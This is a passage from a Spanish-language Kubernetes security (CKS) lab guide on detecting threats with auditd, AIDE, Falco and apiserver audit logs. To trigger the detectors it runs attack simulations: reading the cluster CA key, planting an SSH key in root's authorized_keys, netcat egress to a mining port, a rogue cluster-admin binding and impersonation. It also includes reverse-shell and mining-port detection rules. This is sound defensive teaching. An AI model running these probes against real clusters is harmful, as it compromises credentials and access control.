# Ejercicios Guiados — CKS 6.2: Detectar Amenazas en Infraestructura Física, Apps, Redes, Datos, Usuarios y Cargas de Trabajo

> **Dominio:** Monitoreo, Logging y Seguridad en Runtime · **Peso de esta tarea en el examen:** 4 % (total del dominio 20 %) · **Versión del examen:** CKS v1.34
>
> Los dominios 1–5 tratan de *frenar* cosas. Esta tarea trata de *verlas*. Un clúster con control de admisión perfecto y cero instrumentación de detección es un clúster donde un ataque exitoso no deja ninguna evidencia. Tu trabajo en estos ejercicios es instrumentar cada capa nombrada en el temario, disparar deliberadamente cada detector, y después leer la evidencia cruda que realmente recibiría quien responde al incidente.

---

## Objetivos de aprendizaje

Al terminar estos ejercicios vas a poder:

1. Enumerar la superficie de detección de un nodo Kubernetes e identificar qué capa del temario está ciega.
2. Instrumentar la capa de **host / infraestructura física** con reglas de kernel de `auditd` y líneas base de integridad de archivos con AIDE.
3. Instrumentar la capa de **cargas de trabajo / apps** con Falco: selección de driver, reglas personalizadas, macros, listas, excepciones y semántica de `override`.
4. Instrumentar la capa de **usuarios / identidad** con una política de auditoría escalonada del kube-apiserver y cazar en ella con `jq`.
5. Instrumentar la capa de **datos**: lecturas de Secrets, tokens proyectados de ServiceAccount, texto plano en etcd y robo de snapshots.
6. Instrumentar la capa de **red**: veredictos de flujos descartados, tunelización DNS, reverse shells.
7. Detectar contenedores y Pods estáticos que la API de Kubernetes nunca conoció.
8. Correlacionar todas las fuentes en una única línea de tiempo del ataque y puntuar tu cobertura contra MITRE ATT&CK for Containers.

---

## Topología del laboratorio y prerrequisitos

| Nodo | Rol | Especificación |
|---|---|---|
| `cks-cp` | control plane (kubeadm) | Ubuntu 24.04, 2 vCPU / 4 GiB, Kubernetes v1.34, containerd 2.x |
| `cks-w1` | worker | Ubuntu 24.04, 2 vCPU / 4 GiB, kernel ≥ 5.8 (requerido para el `modern_ebpf` de Falco) |

Necesitás `root` (o `sudo` sin contraseña) **en ambos nodos vía SSH**, más un `kubectl` funcionando con `cluster-admin`. Se asume un CNI que soporte NetworkPolicy; el Ejercicio 6 da un camino con Cilium y una alternativa agnóstica al CNI.

```bash
# Sanity check before you start
kubectl get nodes -o wide
kubectl version --short
ssh cks-w1 'uname -r; systemctl is-active containerd'
```

> **Nota de examen.** En el entorno real del CKS, Falco, `auditd` y los directorios de logs de auditoría suelen estar ya presentes, y **no hay acceso a internet**. El Ejercicio 3 muestra la instalación del paquete para un laboratorio que armás vos; en el examen saltás directo a los pasos de escritura de reglas. Cada ruta usada abajo es la predeterminada de la distribución, así que transfiere directamente.
>
> **Radio de impacto.** El Ejercicio 4 edita el Pod estático `kube-apiserver`. Sacá un snapshot de tu VM o respaldá `/etc/kubernetes/manifests/kube-apiserver.yaml` **fuera** del directorio de manifests primero. Nunca dejes un archivo `.bak`, `.swp` o `~` dentro de `/etc/kubernetes/manifests/` — el kubelet va a intentar parsearlo.

---

## Ejercicio 1 — Mapear la superficie de detección y encontrar la capa ciega

Antes de escribir una sola regla, establecé qué evidencia produce ya el clúster. La ingeniería de detección empieza con un inventario, no con una herramienta.

### Pasos

1. En el control plane, verificá si el API server produce algún log de auditoría:

   ```bash
   ssh cks-cp
   sudo grep -E 'audit-(policy-file|log-path|log-format|log-maxage|log-maxbackup|log-maxsize|webhook-config-file)' \
     /etc/kubernetes/manifests/kube-apiserver.yaml || echo "NO AUDIT FLAGS PRESENT"
   ```

   En un clúster kubeadm de fábrica obtenés:

   ```
   NO AUDIT FLAGS PRESENT
   ```

2. Verificá el subsistema de auditoría del kernel en ambos nodos:

   ```bash
   sudo systemctl is-active auditd
   sudo auditctl -s
   sudo auditctl -l
   ```

   ```
   active
   enabled 1
   failure 1
   pid 812
   rate_limit 0
   backlog_limit 8192
   lost 0
   backlog 0
   backlog_wait_time 60000
   loginuid_immutable 0 unlocked
   No rules
   ```

3. Verificá si hay un sensor de seguridad en runtime en el worker:

   ```bash
   ssh cks-w1 'command -v falco tetragon tracee 2>/dev/null; systemctl list-units --type=service --all | grep -Ei "falco|tetragon|tracee"'
   ```

4. Verificá la exposición del propio kubelet — una API de kubelet sin autenticación es a la vez una vulnerabilidad *y* un hueco de detección, porque el kubelet no lleva ningún rastro de auditoría propio:

   ```bash
   sudo grep -A4 -E 'authentication:|authorization:|readOnlyPort' /var/lib/kubelet/config.yaml
   # From another node, try the read/write port anonymously:
   curl -sk https://cks-w1:10250/pods | head -c 200; echo
   curl -sk http://cks-w1:10255/pods | head -c 200; echo
   ```

   Un kubelet endurecido responde:

   ```
   Unauthorized
   ```

5. Inventariá el plano de observabilidad de red:

   ```bash
   kubectl get pods -n kube-system -o wide | grep -Ei 'cilium|calico|weave|flannel'
   kubectl get networkpolicy -A
   which hubble cilium 2>/dev/null
   ```

6. Completá esta tabla para **tu** clúster. Marcá cada celda con `YES`, `NO` o `PARTIAL`:

   | Capa del temario | Fuente primaria de evidencia | ¿Presente? | ¿Dónde se retiene? |
   |---|---|---|---|
   | Infraestructura física / nodo | `auditd` + `journald` + integridad de archivos | | |
   | Apps y cargas de trabajo | sensor de syscalls (Falco / Tetragon / Tracee) | | |
   | Redes | logs de flujos del CNI, logs DNS, veredictos de NetworkPolicy | | |
   | Datos | auditoría del apiserver sobre `secrets`, auditoría de acceso a etcd | | |
   | Usuarios | auditoría del apiserver `user`/`sourceIPs`/`userAgent` | | |
   | Identidad de carga de trabajo | auditoría de `serviceaccounts/token`, lecturas del archivo de token | | |

### Preguntas de comprensión

- **P1.1** — Tu tabla muestra `auditd` `active` pero `auditctl -l` imprimió `No rules`. ¿Está instrumentada la capa de infraestructura física? Justificá.
- **P1.2** — El API server no tiene `--audit-log-path`. ¿Qué *dos* capas del temario quedan completamente a oscuras por esa única bandera faltante?
- **P1.3** — Toda la evidencia de detección en un clúster por defecto se escribe en el disco local del nodo que está siendo atacado. Nombrá la consecuencia antiforense específica y la solución arquitectónica.
- **P1.4** — `curl -sk https://cks-w1:10250/pods` devolvió una lista completa de Pods. Más allá de la vulnerabilidad obvia, ¿por qué esto es *específicamente* un problema de detección y no solo un problema de hardening?

---

## Ejercicio 2 — Infraestructura física: auditoría del kernel e integridad de archivos

El nodo es la capa con el mayor radio de impacto y la instrumentación por defecto más débil. Todo acá corre en `cks-cp` y `cks-w1`.

### Pasos

1. Escribí un conjunto de reglas de auditoría orientado a detección. Cada regla lleva una clave `-k`, porque la clave es lo único que hace que el log sea consultable después:

   ```bash
   sudo tee /etc/audit/rules.d/70-cks-threats.rules >/dev/null <<'EOF'
   ## Reset and size the kernel audit buffers
   -D
   -b 8192
   -f 1
   --backlog_wait_time 60000

   ## Static Pod directory: any write here is arbitrary code as root on the node
   -w /etc/kubernetes/manifests/ -p wa -k k8s_static_pod

   ## Cluster PKI and admin kubeconfigs: READS matter here, not only writes
   -w /etc/kubernetes/pki/ -p rwa -k k8s_pki
   -w /etc/kubernetes/admin.conf -p rwa -k k8s_kubeconfig
   -w /root/.kube/config -p rwa -k k8s_kubeconfig

   ## etcd data directory: a read is a database theft
   -w /var/lib/etcd/ -p rwa -k etcd_data

   ## Runtime sockets: talking to these bypasses the API server entirely
   -w /run/containerd/containerd.sock -p rwa -k runtime_socket
   -w /var/run/docker.sock -p rwa -k runtime_socket

   ## Kernel module loading: LKM rootkits and eBPF-blinding
   -a always,exit -F arch=b64 -S init_module,finit_module,delete_module -k kernel_modules

   ## Container escape primitives
   -a always,exit -F arch=b64 -S setns -F auid>=1000 -F auid!=unset -k ns_escape
   -w /usr/bin/nsenter -p x -k ns_escape
   -w /usr/bin/crictl -p x -k runtime_cli
   -w /usr/local/bin/ctr -p x -k runtime_cli

   ## Node persistence
   -w /root/.ssh/ -p wa -k ssh_keys
   -w /etc/passwd -p wa -k identity
   -w /etc/shadow -p wa -k identity
   -w /etc/sudoers.d/ -p wa -k identity
   -w /etc/cron.d/ -p wa -k persistence
   -w /etc/systemd/system/ -p wa -k persistence
   EOF

   sudo augenrules --load
   sudo auditctl -l | head -20
   ```

2. Confirmá que las reglas están activas y anotá los contadores:

   ```bash
   sudo auditctl -s
   ```

   ```
   enabled 1
   failure 1
   pid 812
   rate_limit 0
   backlog_limit 8192
   lost 0
   backlog 0
   ```

3. Dispará tres detectores deliberadamente:

   ```bash
   # (a) Static Pod injection
   sudo cp /etc/kubernetes/manifests/kube-proxy.yaml /tmp/x.yaml 2>/dev/null || echo "kind: Pod" | sudo tee /tmp/x.yaml
   sudo cp /tmp/x.yaml /etc/kubernetes/manifests/../audit-probe.yaml   # note: NOT inside manifests/

   # (b) PKI theft
   sudo cat /etc/kubernetes/pki/ca.key > /dev/null

   # (c) SSH key persistence
   echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIProbeKeyDoNotUse probe@lab" | sudo tee -a /root/.ssh/authorized_keys
   ```

4. Consultá por clave — este es el flujo de trabajo que tenés que poder reproducir bajo la presión de tiempo del examen:

   ```bash
   sudo ausearch -k k8s_pki -i --start recent | head -30
   sudo ausearch -k ssh_keys -i --start today | grep -E 'proctitle|SYSCALL' | tail -5
   sudo aureport -k --summary
   ```

   ```
   ----
   type=PROCTITLE msg=audit(08/05/2026 12:55:31.442:2317) : proctitle=cat /etc/kubernetes/pki/ca.key
   type=PATH msg=audit(08/05/2026 12:55:31.442:2317) : item=0 name=/etc/kubernetes/pki/ca.key inode=262401 dev=fc:01 mode=file,600 ouid=root ogid=root
   type=CWD msg=audit(08/05/2026 12:55:31.442:2317) : cwd=/home/ubuntu
   type=SYSCALL msg=audit(08/05/2026 12:55:31.442:2317) : arch=x86_64 syscall=openat success=yes exit=3 a0=0xffffff9c items=1 ppid=4412 pid=4488 auid=ubuntu uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=7 comm=cat exe=/usr/bin/cat subj=unconfined key=k8s_pki
   ```

5. Construí una línea base de integridad de archivos con AIDE, acotada a lo que realmente importa (una línea base de toda la raíz es ruido inutilizable en un nodo Kubernetes):

   ```bash
   sudo apt-get install -y aide-common   # skip on the exam; usually preinstalled

   sudo tee /etc/aide/cks.conf >/dev/null <<'EOF'
   database_in=file:/var/lib/aide/cks.db.gz
   database_out=file:/var/lib/aide/cks.db.new.gz
   gzip_dbout=yes
   report_url=stdout

   # p=perms i=inode n=links u=uid g=gid s=size m=mtime c=ctime + strong hashes
   K8S = p+i+n+u+g+s+m+c+sha256

   /etc/kubernetes                 K8S
   /var/lib/kubelet/config.yaml    K8S
   /opt/cni/bin                    K8S
   /usr/bin/kubelet                K8S
   /usr/bin/kubectl                K8S
   /usr/bin/crictl                 K8S
   /etc/systemd/system             K8S
   EOF

   sudo aide --config=/etc/aide/cks.conf --init
   sudo mv /var/lib/aide/cks.db.new.gz /var/lib/aide/cks.db.gz
   ```

6. Simulá una manipulación y detectala:

   ```bash
   sudo touch /etc/kubernetes/manifests/kube-scheduler.yaml     # ctime/mtime change only
   printf 'kind: Pod\n' | sudo tee /etc/kubernetes/audit-probe2.yaml >/dev/null
   sudo aide --config=/etc/aide/cks.conf --check
   ```

   ```
   Start timestamp: 2026-08-05 13:02:44 +0000 (AIDE 0.18.6)
   AIDE found differences between database and filesystem!!

   Summary:
     Total number of entries:  318
     Added entries:            1
     Removed entries:          0
     Changed entries:          1

   ---------------------------------------------------
   Added entries:
   ---------------------------------------------------
   f++++++++++++++++: /etc/kubernetes/audit-probe2.yaml

   ---------------------------------------------------
   Changed entries:
   ---------------------------------------------------
   f = ... mc.. : /etc/kubernetes/manifests/kube-scheduler.yaml
   ```

7. Limpiá las sondas (dejá las reglas de auditoría en su lugar, los ejercicios posteriores las usan):

   ```bash
   sudo rm -f /etc/kubernetes/audit-probe.yaml /etc/kubernetes/audit-probe2.yaml
   sudo sed -i '/ProbeKeyDoNotUse/d' /root/.ssh/authorized_keys
   sudo aide --config=/etc/aide/cks.conf --init && sudo mv /var/lib/aide/cks.db.new.gz /var/lib/aide/cks.db.gz
   ```

### Preguntas de comprensión

- **P2.1** — ¿Por qué `/etc/kubernetes/pki/` se vigila con `-p rwa` mientras que `/etc/kubernetes/manifests/` se vigila con `-p wa`? ¿Qué perderías usando `-p wa` en el directorio de la PKI?
- **P2.2** — En la salida de `ausearch` de arriba, `uid=root` pero `auid=ubuntu`. ¿Qué campo le entregás a quien responde al incidente, y por qué el otro es casi inútil en un compromiso?
- **P2.3** — El conjunto de reglas **no** termina con `-e 2`. ¿Qué te da `-e 2`, qué cuesta operativamente, y en qué lugar del archivo debe aparecer?
- **P2.4** — AIDE guarda hashes y metadatos de `/etc/kubernetes/pki`, incluidas las claves privadas. ¿Es eso un riesgo de fuga de secretos? ¿Cuál *es* el riesgo real con la base de datos de AIDE, y cómo lo mitigás?
- **P2.5** — `auditctl -s` muestra `lost 0`. Un atacante genera 200 000 eventos de archivo por segundo en una ruta vigilada. Predecí qué pasa con `lost`, con tu evidencia y con el nodo — dados `-f 1` y `--backlog_wait_time 60000`.

---

## Ejercicio 3 — Apps y cargas de trabajo: reglas de Falco que atrapan comportamiento real

### Pasos

1. Instalá Falco en `cks-w1` (saltear en el examen — viene preinstalado):

   ```bash
   ssh cks-w1
   curl -fsSL https://falco.org/repo/falcosecurity-packages.asc \
     | sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
   echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] https://download.falco.org/packages/deb stable main" \
     | sudo tee /etc/apt/sources.list.d/falcosecurity.list
   sudo apt-get update && sudo apt-get install -y falco
   ```

2. Identificá el driver realmente en uso — esto determina qué puede y qué no puede ver Falco:

   ```bash
   falco --version
   sudo grep -A3 '^engine:' /etc/falco/falco.yaml
   systemctl list-units 'falco*' --all --no-pager
   ```

   ```
   Falco version: 0.41.0 (x86_64)
   Driver:
     API version: 8.0.0
     Schema version: 2.0.0
   engine:
     kind: modern_ebpf
     modern_ebpf:
       cpus_for_each_buffer: 2
   falco-modern-bpf.service  loaded active running Falco: Container Native Runtime Security with modern ebpf
   ```

3. Inspeccioná el pipeline de reglas antes de agregarle nada:

   ```bash
   sudo grep -A8 '^rules_files:\|^rules_file:' /etc/falco/falco.yaml
   sudo falco -L | grep -iE 'shell|sensitive|write below' | head
   sudo falco --list syscall | grep -E '^k8s\.|^container\.|^fd\.s' | head -20
   ```

4. Escribí un archivo de reglas hecho a medida. Fijate en el uso de una `list`, dos `macro`s, una `exception` en línea y etiquetas MITRE:

   ```bash
   sudo tee /etc/falco/rules.d/cks-6.2-detections.yaml >/dev/null <<'EOF'
   - required_engine_version: 0.31.0

   - list: cks_allowed_token_readers
     items: [kubelet, kube-proxy, coredns, konnectivity-agent]

   - list: cks_mining_ports
     items: [3333, 4444, 5555, 7777, 14444, 45700]

   - macro: cks_token_path
     condition: fd.name startswith /var/run/secrets/kubernetes.io/serviceaccount

   - macro: cks_bin_dirs
     condition: (fd.directory in (/bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin))

   - rule: ServiceAccount Token Read By Interactive Process
     desc: >
       A shell, HTTP client or file-dumping utility read the projected ServiceAccount
       token inside a container. Normal application SDKs read it too, so this rule is
       deliberately scoped to hands-on-keyboard tooling. MITRE T1552.001.
     condition: >
       open_read and container and cks_token_path
       and not proc.name in (cks_allowed_token_readers)
       and proc.name in (shell_binaries, http_clients, cat, head, tail, base64, xxd)
     output: >
       SA token read inside container (proc=%proc.name cmd=%proc.cmdline parent=%proc.pname
       file=%fd.name user=%user.name uid=%user.uid ns=%k8s.ns.name pod=%k8s.pod.name
       container=%container.name image=%container.image.repository:%container.image.tag)
     priority: CRITICAL
     tags: [container, k8s, credential-access, mitre_credential_access, T1552.001]
     exceptions:
       - name: sanctioned_debug_images
         fields: [k8s.ns.name, container.image.repository]
         comps: [=, =]
         values:
           - [sre-debug, docker.io/nicolaka/netshoot]

   - rule: Outbound Connection To Known Mining Port
     desc: Container opened egress to a port strongly associated with mining pools. MITRE T1496.
     condition: outbound and container and fd.sport in (cks_mining_ports)
     output: >
       Suspicious egress to mining port (proc=%proc.name cmd=%proc.cmdline
       dest=%fd.sip:%fd.sport ns=%k8s.ns.name pod=%k8s.pod.name image=%container.image.repository)
     priority: CRITICAL
     tags: [container, network, mitre_impact, T1496]

   - rule: Binary Written Below Container Bin Dir
     desc: Runtime drift - a new executable appeared in a system bin directory inside a container.
     condition: >
       open_write and container and cks_bin_dirs
       and not proc.name in (package_mgmt_binaries)
     output: >
       Runtime drift: write below bin dir (file=%fd.name proc=%proc.name cmd=%proc.cmdline
       ns=%k8s.ns.name pod=%k8s.pod.name image=%container.image.repository)
     priority: ERROR
     tags: [container, filesystem, mitre_persistence, T1543]

   - rule: STDIO Redirected To Network Socket In Container
     desc: A process duplicated stdin/stdout/stderr onto a socket - the reverse-shell signature.
     condition: >
       evt.type in (dup, dup2, dup3) and evt.dir=> and container
       and fd.num in (0, 1, 2) and fd.type in (ipv4, ipv6)
     output: >
       Reverse shell pattern (proc=%proc.name cmd=%proc.cmdline fd=%fd.name
       ns=%k8s.ns.name pod=%k8s.pod.name container=%container.name)
     priority: CRITICAL
     tags: [container, network, mitre_execution, T1059]
   EOF

   sudo falco --validate /etc/falco/rules.d/cks-6.2-detections.yaml
   ```

   ```
   Tue Aug  5 13:31:02 2026: Validating rules file(s):
   Tue Aug  5 13:31:02 2026:    /etc/falco/rules.d/cks-6.2-detections.yaml
   /etc/falco/rules.d/cks-6.2-detections.yaml: Ok
   ```

5. Ajustá una regla upstream en vez de duplicarla. Silenciá `Terminal shell in container` solo para un namespace de break-glass autorizado, usando la semántica moderna de `override`:

   ```bash
   sudo tee /etc/falco/rules.d/cks-6.2-tuning.yaml >/dev/null <<'EOF'
   - rule: Terminal shell in container
     condition: and not k8s.ns.name = "sre-debug"
     override:
       condition: append
   EOF
   sudo falco --validate /etc/falco/rules.d/cks-6.2-tuning.yaml
   ```

6. Corré Falco en primer plano durante una ventana acotada para poder leer el JSON crudo:

   ```bash
   sudo systemctl stop falco-modern-bpf
   sudo falco -M 180 -o json_output=true -o json_include_output_property=true \
        -o log_level=info --unbuffered
   ```

7. Desde una segunda terminal, generá el comportamiento:

   ```bash
   kubectl create ns prod
   kubectl -n prod run payments --image=nicolaka/netshoot --restart=Never -- sleep 3600
   kubectl -n prod wait --for=condition=Ready pod/payments --timeout=60s

   kubectl -n prod exec -it payments -- sh -c '
     cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 40; echo;
     cp /bin/busybox /usr/local/bin/kube-updater 2>/dev/null;
     timeout 3 nc -w1 198.51.100.77 4444 </dev/null;
     echo done'
   ```

8. Leé lo que produjo Falco. Un evento individual se ve así (reformateado):

   ```json
   {
     "hostname": "cks-w1",
     "output": "13:41:07.883462001: Critical SA token read inside container (proc=cat cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token parent=sh file=/var/run/secrets/kubernetes.io/serviceaccount/token user=root uid=0 ns=prod pod=payments container=payments image=docker.io/nicolaka/netshoot:latest)",
     "output_fields": {
       "container.image.repository": "docker.io/nicolaka/netshoot",
       "container.name": "payments",
       "fd.name": "/var/run/secrets/kubernetes.io/serviceaccount/token",
       "k8s.ns.name": "prod",
       "k8s.pod.name": "payments",
       "proc.cmdline": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
       "proc.pname": "sh",
       "user.name": "root",
       "user.uid": 0
     },
     "priority": "Critical",
     "rule": "ServiceAccount Token Read By Interactive Process",
     "source": "syscall",
     "tags": ["T1552.001","container","credential-access","k8s","mitre_credential_access"],
     "time": "2026-08-05T13:41:07.883462001Z"
   }
   ```

9. Verificá que la excepción funciona — el mismo comando en el namespace autorizado debe ser silencioso:

   ```bash
   kubectl create ns sre-debug
   kubectl -n sre-debug run probe --image=nicolaka/netshoot --restart=Never -- sleep 300
   kubectl -n sre-debug wait --for=condition=Ready pod/probe --timeout=60s
   kubectl -n sre-debug exec probe -- cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null
   ```

10. Restaurá el servicio y confirmá que las alertas siguen llegando al log del sistema:

    ```bash
    sudo systemctl start falco-modern-bpf
    sudo journalctl -u falco-modern-bpf -f --since "2 min ago"
    ```

### Preguntas de comprensión

- **P3.1** — La regla upstream `Terminal shell in container` contiene `proc.tty != 0`. Explicá concretamente qué ataque real excluye eso, y por qué upstream igual la publica así.
- **P3.2** — Escribiste el ajuste como un archivo separado con `override: {condition: append}`. ¿Qué pasa en cambio si pegás un segundo documento con el mismo nombre en `rule:` y **sin** la clave `override`? ¿Qué pasa si usás el `append: true` heredado en Falco 0.41?
- **P3.3** — En `Outbound Connection To Known Mining Port` la condición usa `fd.sport`, no `fd.cport`. Explicá la convención de campos cliente/servidor de Falco y qué haría match la regla si los intercambiaras.
- **P3.4** — Tu excepción usó `fields: [k8s.ns.name, container.image.repository]` con `comps: [=, =]`. ¿Por qué `k8s.ns.name` por sí solo es una clave de excepción peligrosa en un clúster multi-tenant?
- **P3.5** — Falco con `modern_ebpf` traza syscalls. Nombrá dos clases de actividad maliciosa en el nodo que este driver **no** va a ver, y decí qué herramienta del Ejercicio 2 cubre cada una.
- **P3.6** — En el JSON de arriba, `user.name=root` y `user.uid=0`. ¿Es ese el root del *nodo*? Explicá qué está reportando Falco realmente y por qué esto importa al hacer triage.

---

## Ejercicio 4 — Usuarios e identidad: el log de auditoría del API server

### Pasos

1. En `cks-cp`, creá el directorio de política y una política escalonada. El orden importa: gana la **primera regla que hace match**.

   ```bash
   ssh cks-cp
   sudo mkdir -p /etc/kubernetes/audit /var/log/kubernetes/audit

   sudo tee /etc/kubernetes/audit/policy.yaml >/dev/null <<'EOF'
   apiVersion: audit.k8s.io/v1
   kind: Policy
   omitStages:
     - RequestReceived
   omitManagedFields: true
   rules:
     # ---- 1. Drop the high-volume control-loop noise first ----
     - level: None
       users: ["system:kube-scheduler", "system:kube-controller-manager", "system:apiserver"]
       verbs: ["get", "list", "watch"]
     - level: None
       userGroups: ["system:nodes"]
       verbs: ["get", "list", "watch"]
     - level: None
       nonResourceURLs: ["/healthz*", "/readyz*", "/livez*", "/version", "/metrics", "/openapi/*"]

     # ---- 2. Identity layer: full body of every RBAC mutation ----
     - level: RequestResponse
       verbs: ["create", "update", "patch", "delete"]
       resources:
         - group: "rbac.authorization.k8s.io"
           resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]
         - group: ""
           resources: ["serviceaccounts"]

     # ---- 3. Data layer: WHO touched WHICH credential object ----
     - level: Metadata
       resources:
         - group: ""
           resources: ["secrets", "configmaps"]
         - group: ""
           resources: ["serviceaccounts/token"]

     # ---- 4. Workload layer: hands-on-keyboard and privileged creation ----
     - level: Request
       resources:
         - group: ""
           resources: ["pods/exec", "pods/attach", "pods/portforward", "pods/ephemeralcontainers"]
     - level: Request
       verbs: ["create", "update", "patch"]
       resources:
         - group: ""
           resources: ["pods"]
         - group: "apps"
           resources: ["daemonsets", "deployments", "statefulsets"]

     # ---- 5. Everything else ----
     - level: Metadata
   EOF
   ```

2. Parcheá el Pod estático. Agregá las banderas a la lista `command:` del contenedor:

   ```yaml
       - --audit-policy-file=/etc/kubernetes/audit/policy.yaml
       - --audit-log-path=/var/log/kubernetes/audit/audit.log
       - --audit-log-format=json
       - --audit-log-maxage=30
       - --audit-log-maxbackup=10
       - --audit-log-maxsize=100
   ```

   Agregá los montajes bajo `spec.containers[0].volumeMounts:`:

   ```yaml
       - name: audit-policy
         mountPath: /etc/kubernetes/audit
         readOnly: true
       - name: audit-log
         mountPath: /var/log/kubernetes/audit
         readOnly: false
   ```

   Agregá los volúmenes bajo `spec.volumes:`:

   ```yaml
     - name: audit-policy
       hostPath:
         path: /etc/kubernetes/audit
         type: DirectoryOrCreate
     - name: audit-log
       hostPath:
         path: /var/log/kubernetes/audit
         type: DirectoryOrCreate
   ```

   ```bash
   sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml.bak  # NOT in manifests/
   sudo vi /etc/kubernetes/manifests/kube-apiserver.yaml
   ```

3. Observá cómo vuelve el API server. Va a estar inalcanzable durante 20–60 s:

   ```bash
   sudo crictl ps --name kube-apiserver
   until kubectl get --raw='/readyz' 2>/dev/null; do sleep 3; done; echo
   sudo ls -l /var/log/kubernetes/audit/
   ```

   Si nunca vuelve, el manifiesto está mal. Leé los logs del runtime directamente — `kubectl` está caído, así que `crictl` es la única vía de entrada:

   ```bash
   sudo crictl ps -a --name kube-apiserver -o json | jq -r '.containers[0].id'
   sudo crictl logs --tail 40 <container-id>
   sudo ls /var/log/pods/kube-system_kube-apiserver-cks-cp_*/kube-apiserver/
   ```

4. Generá las señales de la capa de identidad que vas a cazar:

   ```bash
   # (a) anonymous probing
   curl -sk https://127.0.0.1:6443/api/v1/namespaces/kube-system/secrets | head -c 200; echo

   # (b) a low-privilege ServiceAccount trying to escalate
   kubectl -n prod create sa app-sa
   TOKEN=$(kubectl -n prod create token app-sa --duration=10m)
   APISERVER=https://127.0.0.1:6443
   curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets | jq -r '.message' 
   curl -sk -H "Authorization: Bearer $TOKEN" -A "python-requests/2.32.3" \
        $APISERVER/api/v1/namespaces/prod/pods | jq -r '.kind'

   # (c) hands on keyboard
   kubectl -n prod exec payments -- id

   # (d) a rogue cluster-admin binding
   kubectl create clusterrolebinding rogue-admin \
     --clusterrole=cluster-admin --serviceaccount=prod:app-sa

   # (e) impersonation
   kubectl get secrets -n kube-system --as=system:serviceaccount:prod:app-sa | head -3
   ```

5. Cazá. Estas líneas de `jq` son el entregable central de este ejercicio:

   ```bash
   AUDIT=/var/log/kubernetes/audit/audit.log

   # 1. Anonymous identities
   sudo jq -c 'select(.user.username=="system:anonymous")
     | {t:.requestReceivedTimestamp, ip:.sourceIPs[0], uri:.requestURI, code:.responseStatus.code}' $AUDIT

   # 2. Authorization failures ranked by identity - the reconnaissance fingerprint
   sudo jq -r 'select(.responseStatus.code==403) | .user.username' $AUDIT | sort | uniq -c | sort -rn | head

   # 3. Every exec / attach / port-forward
   sudo jq -c 'select(.objectRef.subresource // "" | test("exec|attach|portforward"))
     | {t:.requestReceivedTimestamp, u:.user.username, ip:.sourceIPs[0],
        ns:.objectRef.namespace, pod:.objectRef.name, q:(.requestURI|split("?")[1])}' $AUDIT

   # 4. Secret access by non-system identities
   sudo jq -c 'select(.objectRef.resource=="secrets"
       and (.verb|test("^(get|list|watch)$"))
       and ((.user.username|startswith("system:")) | not))
     | {t:.requestReceivedTimestamp, u:.user.username, ns:.objectRef.namespace,
        name:(.objectRef.name // "ALL"), code:.responseStatus.code}' $AUDIT

   # 5. RBAC mutations - who granted what to whom
   sudo jq -c 'select(.objectRef.apiGroup=="rbac.authorization.k8s.io"
       and (.verb|test("create|update|patch|delete")))
     | {t:.requestReceivedTimestamp, u:.user.username, kind:.objectRef.resource,
        name:.objectRef.name, subjects:(.requestObject.subjects // []),
        role:(.requestObject.roleRef.name // null)}' $AUDIT

   # 6. Impersonation
   sudo jq -c 'select(.impersonatedUser != null)
     | {u:.user.username, as:.impersonatedUser.username, verb:.verb, uri:.requestURI}' $AUDIT

   # 7. User-Agent anomalies - SDK/CLI fingerprinting
   sudo jq -r 'select(.user.username|startswith("system:serviceaccount:"))
     | [.user.username, .userAgent] | @tsv' $AUDIT | sort | uniq -c | sort -rn | head

   # 8. Privileged Pod creation
   sudo jq -c 'select(.objectRef.resource=="pods" and .verb=="create"
       and ((.requestObject.spec.containers[]?.securityContext.privileged == true)
            or (.requestObject.spec.hostPID == true)
            or (.requestObject.spec.hostNetwork == true)))
     | {u:.user.username, ns:.objectRef.namespace,
        pod:.requestObject.metadata.name, node:.requestObject.spec.nodeName}' $AUDIT
   ```

   Forma esperada de la consulta 5:

   ```json
   {"t":"2026-08-05T14:07:55.113402Z","u":"kubernetes-admin","kind":"clusterrolebindings","name":"rogue-admin","subjects":[{"kind":"ServiceAccount","name":"app-sa","namespace":"prod"}],"role":"cluster-admin"}
   ```

6. Armá un resumen de triage de todo el log:

   ```bash
   sudo jq -r '[.user.username, .verb, (.objectRef.resource // .requestURI), (.responseStatus.code|tostring)] | @tsv' $AUDIT \
     | sort | uniq -c | sort -rn | head -25
   ```

### Preguntas de comprensión

- **P4.1** — La consulta 8 no devolvió nada aunque creaste Pods. Después funcionó tras la edición de política del paso 1, regla 4. Explicá exactamente qué **nivel** de auditoría puebla `requestObject`, y qué te da `Metadata` por sí solo.
- **P4.2** — La política registra `secrets` en `Metadata`, no en `RequestResponse`. Indicá qué detección resignás, y la razón concreta por la que `RequestResponse` sobre Secrets suele ser la decisión equivocada.
- **P4.3** — `omitStages: [RequestReceived]` está puesto globalmente. ¿Qué es un evento `RequestReceived`, y cuál es la única investigación donde descartarlo duele?
- **P4.4** — La consulta 1 muestra impactos de `system:anonymous` con `responseStatus.code: 403`, y otras entradas con `401`. ¿Cuál es la diferencia en lo que realmente pasó, y cuál indica que la autenticación anónima está **habilitada**?
- **P4.5** — La consulta 7 muestra `system:serviceaccount:prod:app-sa` con `userAgent: python-requests/2.32.3`. ¿Por qué es esa una señal más fuerte que el 403 de la consulta 2, y cómo se vería el User-Agent *benigno* para esa SA?
- **P4.6** — Un atacante con root en el nodo quiere borrar sus rastros en el API server. Dados `--audit-log-maxsize=100` y `--audit-log-maxbackup=10`, describí la técnica antiforense que **no** necesita acceso de escritura al archivo de log, y el control arquitectónico que la derrota.

---

## Ejercicio 5 — Datos: Secrets, tokens proyectados y etcd

### Pasos

1. Creá un Secret y observá cómo se ve para la capa de datos:

   ```bash
   kubectl -n prod create secret generic payments-db \
     --from-literal=username=svc_payments \
     --from-literal=password='Tr0ub4dor&3-PROD'
   ```

